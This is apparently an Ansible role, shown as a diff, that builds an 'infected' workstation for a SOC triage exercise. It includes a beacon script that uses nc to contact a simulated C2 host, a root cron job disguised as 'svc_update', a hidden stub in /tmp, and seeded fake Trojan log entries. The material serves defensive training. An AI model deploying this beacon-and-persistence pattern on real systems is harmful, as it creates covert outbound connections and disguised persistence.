@@ -1,0 +1,84 @@
+---
+# Role: employee-ws
+# Configures the infected employee workstation (Exercise 1 – SOC Analyst Triage).
+# Installs a cron job that beacons to the C2 server every 5 minutes,
+# generating the suspicious traffic that triggers the SIEM alert.
+# Also installs a Wazuh agent to forward logs to the SIEM.
+# MITRE ATT&CK: T1053.005 (Scheduled Task – Cron), T1071.001 (C2 Beacon)
+
+- name: Create beacon script directory
+  ansible.builtin.file:
+    path: /opt/c2-beacon
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Deploy beacon script
+  ansible.builtin.copy:
+    dest: /opt/c2-beacon/beacon.sh
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # NG-SOC LM8 – C2 beacon simulation (training artefact)
+      # Connects to the simulated C2 server and writes a syslog entry.
+      # This script replicates the behaviour of banking malware (no actual malware).
+
+      C2_IP="{{ c2_ip }}"
+      C2_PORT="{{ c2_port }}"
+      PROCESS_NAME="svc_update"
+      LOGFILE="/var/log/svc-update.log"
+
+      logger -t "$PROCESS_NAME" "WARN possible Trojan infection – initiating C2 checkin to $C2_IP:$C2_PORT"
+      echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) [$PROCESS_NAME] WARN possible Trojan infection" >> "$LOGFILE"
+
+      # Attempt TCP connection (beacon)
+      (echo "BEACON-$(hostname)" | nc -w 3 "$C2_IP" "$C2_PORT") 2>/dev/null || true
+      echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) [$PROCESS_NAME] INFO beacon sent to $C2_IP:$C2_PORT" >> "$LOGFILE"
+
+- name: Deploy cron job for periodic beaconing (T1053.005)
+  ansible.builtin.copy:
+    dest: /etc/cron.d/svc-update
+    content: |
+      # NG-SOC training artefact – simulates malware C2 beacon (every 5 min)
+      */5 * * * * root /opt/c2-beacon/beacon.sh
+    mode: "0644"
+
+- name: Create simulated malware process stub (T1543 – persistent service stub)
+  ansible.builtin.copy:
+    dest: /tmp/.svc_update
+    content: |
+      #!/bin/bash
+      # Stub file simulating malware dropper location.
+      # This is a training artefact – not executable malware.
+      echo "NG-SOC LM8 training stub – T1574 DLL Search Order Hijacking simulation"
+    mode: "0755"
+
+- name: Write initial syslog entries (pre-seeded alert events for Exercise 1)
+  ansible.builtin.shell:
+    cmd: |
+      logger -t svc_update "WARN possible Trojan infection – process /tmp/.svc_update spawned"
+      logger -t svc_update "INFO outbound connection attempt to 10.10.20.20:4444"
+      logger -t svc_update "WARN suspicious DNS query: update-svc.blackfalcon-sim.internal"
+  changed_when: true
+
+- name: Install Wazuh agent
+  ansible.builtin.apt:
+    deb: "https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb"
+    state: present
+  ignore_errors: true
+
+- name: Configure Wazuh agent to register with SIEM manager
+  ansible.builtin.lineinfile:
+    path: /var/ossec/etc/ossec.conf
+    regexp: '<address>MANAGER_IP</address>'
+    line: "    <address>{{ wazuh_manager_ip }}</address>"
+    backrefs: true
+  ignore_errors: true
+
+- name: Enable and start Wazuh agent
+  ansible.builtin.service:
+    name: wazuh-agent
+    state: started
+    enabled: true
+  ignore_errors: true
